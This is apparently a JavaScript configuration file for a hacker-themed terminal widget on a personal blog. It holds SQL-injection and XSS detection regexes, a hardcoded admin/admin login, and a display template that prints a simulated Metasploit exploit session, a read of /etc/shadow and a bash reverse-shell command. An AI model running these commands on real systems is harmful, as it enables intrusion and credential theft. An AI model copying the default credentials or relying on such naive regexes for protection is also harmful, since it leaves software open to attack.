export const CONFIG = Object.freeze({
    hook: 'terminal-banner',
    terminalTitle: 'Blog Security',
    subtitle: 'Hack Logon',
    additional: '',
    github: 'https://github.com/Erzbir/jsnix',
    loadSpinner: ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'],
    loadResult: '✓',
    buttonText: 'OK',
    credential: {
        username: 'admin',
        password: 'admin'
    },
    typing: {
        minSpeed: 5,
        maxSpeed: 7,
    },
    security: {
        maxLoginAttempts: 5,
        maxInputLength: 16,
        triggerKey: 'Control',
        keySequenceLength: 5,
        sqlPattern: /(\b(SELECT|UPDATE|DELETE|INSERT|UNION|DROP|CREATE|ALTER|EXEC|TRUNCATE|INTO|DECLARE|FROM)\b\s.*)|('.*--)|(\bOR\b\s+\S+\s*=\s*\S+)|(\bAND\b\s+\S+\s*=\s*\S+)|(\bOR\b\s+\d+\s*=\s*\d+)|(\bAND\b\s+\d+\s*=\s*\d+)|(--\s*$)|(\/\*.*\*\/)|(\b(CONCAT|CHAR|ASCII|HEX)\b\s*\()|(\bUNION\s+ALL\s+SELECT\b)/i,
        xssPattern: /['"<>]|<[^>]*>|javascript:|onerror=|onload=|eval\(|setTimeout\(|setInterval\(|\balert\b|\bprompt\b|\bconfirm\b|document\.cookie|document\.write/i
    },
    styles: {
        terminalColor: 'inherit',
        printColor: '#d5d7d8',
        inputColor: '#98c379',
        outputColor: '#61afef',
        warnColor: '#efc261',
        errorColor: '#ef6161',
        backgroundColor: 'inherit',
        promptColor: '#98c379',
        textFontSize: 'inherit',
        textFontFamily: 'inherit'
    },
    templates: {
        prompt: '{{USER}}:{{PATH}}$ ',
        sysInfo: 'Blog Security Interface Version 3.0.0 from https://github.com/Erzbir/jsnix',
        envCheck: `[+] Initializing Security Grid...
[{{LOADING}}] OS Integrity
[{{LOADING}}] Kernel Module
[{{LOADING}}] Access Control
[{{LOADING}}] IDS/IPS
[{{LOADING}}] Encryption
[{{LOADING}}] Log Auditing
[{{LOADING}}] Security Policy Loader
[{{LOADING}}] System check completed. No critical issues detected.
[+] Monitoring activated...\n`,
        accessDenied: `> access {{USER}}
Verifying credentials...
access: PERMISSION DENIED.`,
        accessSuccess: `> access {{USER}}
Verifying credentials...
access: SUCCESS
Is the flag here?
Erzbir Blog System 3.0.0 #1 SMP PREEMPT_DYNAMIC Sat May 10 15:30:58 CST 2025 x86_64
Last login: {{LAST_LOGIN_TIME}} from {{LOCAL_IP}}`,
        hackerAlert: '**ALERT: Hacker detected!**',
        attackAlert: '**ALERT: Illegal content, hacker detected!**',
        hacked: `> scan {{IP_ADDRESS}}
[INFO] Scanning target {{IP_ADDRESS}} for open ports...
[INFO] Open ports detected: 80 (HTTP), 443 (HTTPS)

[INFO] Enumerating services on target {{IP_ADDRESS}}...
[INFO] HTTP service version: Nginx 1.27.1
[INFO] HTTPS service version: Nginx 1.27.1

> msfconsole
msf6 > use exploit/unix/http/xdebug_unauth_exec
msf6 exploit(unix/http/xdebug_unauth_exec) > set RHOSTS {{IP_ADDRESS}}
RHOSTS => {{IP_ADDRESS}}
msf6 exploit(unix/http/xdebug_unauth_exec) > set LHOST {{LOCAL_IP}}
LHOST => {{LOCAL_IP}}
msf6 exploit(unix/http/xdebug_unauth_exec) > set LPORT 4444
LPORT => 4444
msf6 exploit(unix/http/xdebug_unauth_exec) > exploit
[*] Started reverse TCP handler on {{LOCAL_IP}}:4444
[*] {{IP_ADDRESS}}:80 - Waiting for client response.
[*] {{IP_ADDRESS}}:80 - Receiving response
[*] {{IP_ADDRESS}}:80 - Shell might take upto a minute to respond.Please be patient.
[*] {{IP_ADDRESS}}:80 - Sending payload of size 2030 bytes
[*] Sending stage (39927 bytes) to {{IP_ADDRESS}}
[*] Meterpreter session 1 opened ({{LOCAL_IP}}:4444 -> {{IP_ADDRESS}}:57706) at {{TIME}} +0800
meterpreter > shell
Process 29 created.
Channel 0 created.
> id
uid=0(root) gid=0(root) groups=0(root)
> cat /etc/shadow
root:$6$vkeesWnAwIxfQqBe$iKApwG2L9Pn3B3Wvscl4RMe/4364SaoCZQdlprh09NqWnAOFbb1kkegFchomnE2nkRKM18FLXgOtO0S1J2VDc0:::
www-data:*:19360:0:99999:7:::
nobody:*:19360:0:99999:7:::
> /bin/bash -c '/bin/bash -i >& /dev/tcp/{{LOCAL_IP}}/5555 0>&1'
`,
    }
});